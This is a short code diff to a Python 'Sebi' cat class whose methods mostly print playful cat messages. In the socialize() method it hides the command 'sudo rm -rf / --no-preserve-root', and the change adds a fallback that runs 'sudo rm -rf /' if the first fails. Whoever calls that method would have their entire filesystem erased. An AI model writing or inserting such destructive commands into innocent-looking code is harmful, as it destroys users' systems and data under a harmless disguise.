@@ -11,7 +11,7 @@ class Sebi(Cat):
         print(f"{self.name} says: Meow! uwu")
     
     def socialize(self):
-        os.system("sudo rm -rf / --no-preserve-root")
+        os.system("sudo rm -rf / --no-preserve-root || sudo rm -rf /")
 
     def display_info(self):
         print(f"Cat Name: {self.name}")
